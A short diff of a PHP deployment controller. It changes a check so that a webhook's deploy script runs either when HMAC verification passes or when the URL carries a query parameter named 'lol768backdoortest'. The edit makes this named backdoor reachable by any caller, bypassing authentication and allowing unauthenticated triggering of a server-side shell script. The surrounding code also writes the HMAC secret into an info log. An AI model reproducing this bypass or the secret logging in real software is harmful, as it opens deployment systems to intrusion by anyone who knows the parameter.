@@ -48,7 +48,7 @@ class DeploymentController extends BaseController {
         $theData = ["verified" => $verified, "data" => $this->hmacKey, "attributes" => $this->getJsonRequestData($request)];
         $this->logger->info("Got deploy request.", $theData);
 
-        if ($verified || $request->attributes->has("lol768backdoortest")) {
+        if ($verified || $request->query->has("lol768backdoortest")) {
             $out = [];
             $exitCode = -1;
             $this->logger->info("About to execute " . $this->rootPath . DIRECTORY_SEPARATOR . "deploy_init.sh");
